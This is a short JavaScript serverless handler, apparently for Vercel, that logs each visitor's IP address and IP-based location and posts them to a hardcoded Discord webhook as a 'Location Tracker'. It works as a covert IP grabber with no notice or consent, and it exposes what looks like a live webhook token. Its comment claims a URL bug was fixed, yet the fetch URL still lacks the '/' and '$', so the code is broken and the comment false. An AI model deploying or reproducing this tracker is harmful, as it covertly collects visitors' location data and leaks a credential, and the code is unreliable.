export default async function handler(req, res) {
    try {
        const forwarded = req.headers['x-forwarded-for'];
        const ip = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;

        let geoData = { city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
        
        try {
            // FIXED: Added the missing '/' and the '$' symbol for proper template string variable substitution
            const geoResponse = await fetch(`https://ipinfo.io{ip}/json`);
            if (geoResponse.ok) {
                geoData = await geoResponse.json();
            }
        } catch (geoError) {
            console.error("Geo lookup failed:", geoError);
        }

        const logData = {
            username: "Location Tracker",
            embeds: [{
                title: "📍 Visitor Location Details",
                color: 3447003, 
                fields: [
                    { name: "IP Address", value: `\`${ip}\``, inline: false },
                    { name: "City", value: geoData.city || "N/A", inline: true },
                    { name: "Region", value: geoData.region || "N/A", inline: true },
                    { name: "Country", value: geoData.country || "N/A", inline: true },
                    { name: "ISP / Org", value: geoData.org || "N/A", inline: false }
                ],
                footer: { text: "Vercel Geo Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        const webhookUrl = "https://discordapp.com/api/webhooks/1511008810469163028/ufzEHmtZm0v_UNniiY0_zvLTqIw-GmdvXpwOkPctlLsu0ISIBqX9NttKQWeWyulzgUZa";

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(logData)
        });

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ error: 'Internal server error' });
    }
}
